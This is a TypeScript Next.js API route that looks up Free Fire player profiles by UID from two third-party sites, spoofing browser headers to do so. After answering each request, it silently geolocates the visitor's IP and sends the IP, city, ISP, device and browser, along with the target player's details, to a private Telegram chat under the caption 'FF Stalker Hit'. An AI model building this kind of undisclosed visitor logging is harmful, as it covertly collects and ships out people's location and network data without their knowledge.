import type { NextApiRequest, NextApiResponse } from 'next';
import { waitUntil } from '@vercel/functions';

function getIP(req: NextApiRequest): string {
  const fwd = req.headers['x-forwarded-for'];
  const fwdIp = Array.isArray(fwd) ? fwd[0] : fwd?.split(',')[0]?.trim();
  return fwdIp || (req.headers['x-real-ip'] as string) || req.socket.remoteAddress || '127.0.0.1';
}

function getBrowser(ua: string): string {
  if (/Edg\//i.test(ua)) return 'Microsoft Edge';
  if (/OPR\/|Opera/i.test(ua)) return 'Opera';
  if (/SamsungBrowser/i.test(ua)) return 'Samsung Browser';
  if (/UCBrowser/i.test(ua)) return 'UC Browser';
  if (/YaBrowser/i.test(ua)) return 'Yandex Browser';
  if (/Firefox\//i.test(ua)) return 'Firefox';
  if (/Chrome\//i.test(ua)) return 'Chrome';
  if (/Safari\//i.test(ua)) return 'Safari';
  if (/MSIE|Trident/i.test(ua)) return 'Internet Explorer';
  return 'Unknown Browser';
}

function getDevice(ua: string): string {
  if (/iPad/i.test(ua)) return 'iPad (iOS)';
  if (/iPhone/i.test(ua)) return 'iPhone (iOS)';
  if (/Android/i.test(ua) && /Mobile/i.test(ua)) return 'Android Phone';
  if (/Android/i.test(ua)) return 'Android Tablet';
  if (/Windows NT/i.test(ua)) return 'Windows PC';
  if (/Macintosh|Mac OS X/i.test(ua)) return 'Mac';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Unknown Device';
}

async function sendTelegramNotif(req: NextApiRequest, merged: any) {
  const botToken = process.env.TG_BOT_TOKEN;
  const chatId = process.env.TG_CHAT_ID;
  if (!botToken || !chatId) return;

  const ip = getIP(req);
  const ua = String(req.headers['user-agent'] || '');
  const browser = getBrowser(ua);
  const device = getDevice(ua);
  const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const photoUrl = merged.avatarUrl || merged.equippedCharacterIconUrl || null;

  let city = '?', region = '?', country = '?', isp = '?';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country,isp,status`, {
      signal: AbortSignal.timeout(3000),
    });
    const geo = await geoRes.json();
    if (geo.status === 'success') {
      city = geo.city;
      region = geo.regionName;
      country = geo.country;
      isp = geo.isp;
    }
  } catch (_) {}

  const caption = [
    `<blockquote>🎯 <b>FF Stalker Hit</b></blockquote>`,
    ``,
    `<b>👤 Player Info</b>`,
    `🆔 <b>UID</b>        › <code>${merged.accountId ?? '-'}</code>`,
    `📛 <b>Nickname</b>   › ${merged.nickname ?? '-'}`,
    `🌐 <b>Region</b>     › ${merged.region ?? '-'}`,
    `📈 <b>Level</b>      › ${merged.level ?? '-'}`,
    `⭐ <b>EXP</b>        › ${merged.exp ?? '-'}`,
    `👍 <b>Liked</b>      › ${merged.liked ?? '-'}`,
    `🏆 <b>BR Rank</b>    › ${merged.rank ?? '-'}`,
    `🎮 <b>CS Rank</b>    › ${merged.csRank ?? '-'}`,
    `💳 <b>Credit Score</b> › ${merged.creditScore ?? '-'}`,
    `🗓 <b>Created</b>    › ${merged.createAt ?? '-'}`,
    `🕐 <b>Last Login</b> › ${merged.lastLoginAt ?? '-'}`,
    `📝 <b>Bio</b>        › ${merged.signature ?? '-'}`,
    ``,
    `<b>🛡️ Guild Info</b>`,
    `🏰 <b>Name</b>       › ${merged.guildName ?? '-'}`,
    `📊 <b>Level</b>      › ${merged.guildLevel ?? '-'}`,
    `👥 <b>Members</b>    › ${merged.memberNum ?? '-'}/${merged.capacity ?? '-'}`,
    ``,
    `<b>🌐 Visitor Info</b>`,
    `🔌 <b>IP</b>      › <code>${ip}</code>`,
    `📍 <b>Kota</b>    › ${city}, ${region}`,
    `🌍 <b>Negara</b>  › ${country}`,
    `📡 <b>ISP</b>     › ${isp}`,
    `🖥 <b>Device</b>  › ${device}`,
    `🌏 <b>Browser</b> › ${browser}`,
    ``,
    `<blockquote>🕐 ${ts}</blockquote>`,
  ].join('\n');

  if (photoUrl) {
    const photoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        photo: photoUrl,
        caption,
        parse_mode: 'HTML',
      }),
    });
    if (!photoRes.ok) {
      const errBody = await photoRes.text();
      console.error('telegram_sendPhoto_failed', photoRes.status, errBody);
      const msgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML' }),
      });
      if (!msgRes.ok) {
        console.error('telegram_sendMessage_failed', msgRes.status, await msgRes.text());
      }
    }
  } else {
    const msgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML' }),
    });
    if (!msgRes.ok) {
      console.error('telegram_sendMessage_failed', msgRes.status, await msgRes.text());
    }
  }
}

const FREEFIREHUB_BASE = 'https://freefirehub.com';
const ADENPEDIA_URL = 'https://adenpedia.my.id/adencs/info.php';
const ICON_BASE = 'https://raw.githubusercontent.com/ashqking/FF-Items/main/ICONS';

const FREEFIREHUB_HEADERS = {
  'user-agent':
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
  referer: `${FREEFIREHUB_BASE}/player-tracker`,
};

const ADENPEDIA_HEADERS = {
  Accept: 'application/json',
  'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  Referer: 'https://adenpedia.my.id/',
};

function getCI(obj: any, key: string) {
  if (!obj || typeof obj !== 'object') return undefined;
  if (obj[key] !== undefined) return obj[key];
  const found = Object.keys(obj).find((k) => k.toLowerCase() === key.toLowerCase());
  return found ? obj[found] : undefined;
}

function pick(...values: any[]) {
  for (const value of values) {
    if (value !== undefined && value !== null && value !== '') return value;
  }
  return undefined;
}

function buildIconUrl(itemId: any) {
  if (!itemId) return null;
  return `${ICON_BASE}/${itemId}.png`;
}

function toIconList(ids: any) {
  if (!Array.isArray(ids)) return [];
  return ids.map(buildIconUrl).filter(Boolean);
}

async function fetchFreefirehub(uid: string, region: string) {
  const url = `${FREEFIREHUB_BASE}/api/player/${uid}?region=${region}&matchType=all`;
  const upstream = await fetch(url, { headers: FREEFIREHUB_HEADERS, cache: 'no-store' });
  if (!upstream.ok) throw new Error(`freefirehub_http_${upstream.status}`);
  const data = await upstream.json();
  const info = getCI(data?.profile, 'basicinfo');
  if (!info || !getCI(info, 'accountid')) throw new Error('freefirehub_empty');
  return data;
}

async function fetchAdenpedia(uid: string) {
  const url = `${ADENPEDIA_URL}?uid=${encodeURIComponent(uid)}`;
  const upstream = await fetch(url, { headers: ADENPEDIA_HEADERS, cache: 'no-store' });
  if (!upstream.ok) throw new Error(`adenpedia_http_${upstream.status}`);
  const data = await upstream.json();
  if (!data?.basicInfo?.accountId) throw new Error('adenpedia_empty');
  return data;
}

function normalizeFreefirehub(data: any) {
  const profile = data?.profile || {};
  const info = getCI(profile, 'basicinfo') || {};
  const social = getCI(profile, 'socialinfo') || {};
  const guild = getCI(profile, 'clanbasicinfo') || {};
  const credit = getCI(profile, 'creditscoreinfo') || {};
  const outfit = getCI(profile, 'profileinfo') || {};

  const equippedSkinIds = getCI(outfit, 'equipedskills') || [];
  const weaponSkinIds = getCI(info, 'weaponskinshows') || [];
  const characterId = getCI(outfit, 'avatarid');

  return {
    accountId: getCI(info, 'accountid'),
    nickname: getCI(info, 'nickname'),
    level: getCI(info, 'level'),
    exp: getCI(info, 'exp'),
    liked: getCI(info, 'liked'),
    region: getCI(info, 'region'),
    createAt: getCI(info, 'createat'),
    lastLoginAt: getCI(info, 'lastloginat'),
    headPic: getCI(info, 'headpic'),
    rank: getCI(info, 'rank'),
    csRank: getCI(info, 'csrank'),
    avatarUrl: buildIconUrl(getCI(info, 'headpic')),
    titleIconUrl: buildIconUrl(getCI(info, 'title')),
    equippedCharacterId: characterId,
    equippedCharacterIconUrl: buildIconUrl(characterId),
    equippedSkinIconUrls: toIconList(equippedSkinIds),
    equippedWeaponSkinIconUrls: toIconList(weaponSkinIds),
    signature: getCI(social, 'signature'),
    creditScore: getCI(credit, 'creditscore'),
    guildName: pick(getCI(guild, 'clanName'), getCI(guild, 'clanname'), getCI(guild, 'guildName')),
    guildLevel: pick(getCI(guild, 'clanLevel'), getCI(guild, 'clanlevel'), getCI(guild, 'guildLevel')),
    memberNum: pick(getCI(guild, 'memberNum'), getCI(guild, 'membernum')),
    capacity: getCI(guild, 'capacity'),
  };
}

function normalizeAdenpedia(data: any) {
  const info = data?.basicInfo || {};
  const guild = data?.clanBasicInfo || {};
  const social = data?.socialInfo || {};
  const credit = data?.creditScoreInfo || {};

  return {
    accountId: info.accountId,
    nickname: info.nickname,
    level: info.level,
    exp: info.exp,
    liked: info.liked,
    region: info.region,
    createAt: info.createAt,
    lastLoginAt: info.lastLoginAt,
    headPic: info.headPic,
    rank: info.rank,
    csRank: info.csRank,
    badgeCnt: info.badgeCnt,
    primeInfo: info.primeInfo,
    signature: social.signature,
    creditScore: credit.creditScore,
    guildName: guild.clanName,
    guildLevel: guild.clanLevel,
    memberNum: guild.memberNum,
    capacity: guild.capacity,
  };
}

function mergeSources(primary: any, fallback: any) {
  if (!primary) return fallback;
  if (!fallback) return primary;
  const merged: Record<string, any> = {};
  const keys = new Set([...Object.keys(primary), ...Object.keys(fallback)]);
  keys.forEach((key) => {
    merged[key] = pick(primary[key], fallback[key]);
  });
  return merged;
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'GET') {
    res.setHeader('Allow', ['GET']);
    return res.status(405).json({ error: `Method ${req.method} tidak diizinkan` });
  }

  const { uid, region } = req.query;
  const uidStr = String(uid || '');
  const regionStr = String(region || 'ALL');

  if (!uidStr || !/^\d{6,15}$/.test(uidStr)) {
    return res.status(400).json({ error: 'UID tidak valid. Masukkan UID Free Fire yang benar (angka saja).' });
  }

  const [freefirehubResult, adenpediaResult] = await Promise.allSettled([
    fetchFreefirehub(uidStr, regionStr),
    fetchAdenpedia(uidStr),
  ]);

  if (freefirehubResult.status === 'rejected') {
    console.error('freefirehub_error', freefirehubResult.reason);
  }
  if (adenpediaResult.status === 'rejected') {
    console.error('adenpedia_error', adenpediaResult.reason);
  }

  const freefirehubData =
    freefirehubResult.status === 'fulfilled' ? normalizeFreefirehub(freefirehubResult.value) : null;
  const adenpediaData =
    adenpediaResult.status === 'fulfilled' ? normalizeAdenpedia(adenpediaResult.value) : null;

  if (!freefirehubData && !adenpediaData) {
    return res.status(502).json({ error: 'Server data lagi bermasalah, coba lagi sebentar.' });
  }

  const merged = mergeSources(freefirehubData, adenpediaData);

  if (!merged?.accountId) {
    return res.status(404).json({ error: 'Data tidak ditemukan untuk UID ini.' });
  }

  res.setHeader('Cache-Control', 's-maxage=60, stale-while-revalidate=120');
  res.status(200).json({
    basicInfo: {
      accountId: merged.accountId,
      nickname: merged.nickname,
      region: merged.region,
      level: merged.level,
      exp: merged.exp,
      headPic: merged.headPic,
      rank: merged.rank,
      csRank: merged.csRank,
      badgeCnt: merged.badgeCnt,
      liked: merged.liked,
      createAt: merged.createAt,
      lastLoginAt: merged.lastLoginAt,
      primeInfo: merged.primeInfo,
      avatarUrl: merged.avatarUrl,
      titleIconUrl: merged.titleIconUrl,
      equippedCharacterIconUrl: merged.equippedCharacterIconUrl,
      equippedSkinIconUrls: merged.equippedSkinIconUrls,
      equippedWeaponSkinIconUrls: merged.equippedWeaponSkinIconUrls,
    },
    guildBasicInfo: {
      guildName: merged.guildName,
      guildLevel: merged.guildLevel,
      memberNum: merged.memberNum,
      capacity: merged.capacity,
    },
    socialInfo: {
      signature: merged.signature,
    },
    creditScoreInfo: {
      creditScore: merged.creditScore,
    },
  });

  waitUntil(
    sendTelegramNotif(req, merged).catch((err) => {
      console.error('telegram_notif_error', err);
    })
  );
}
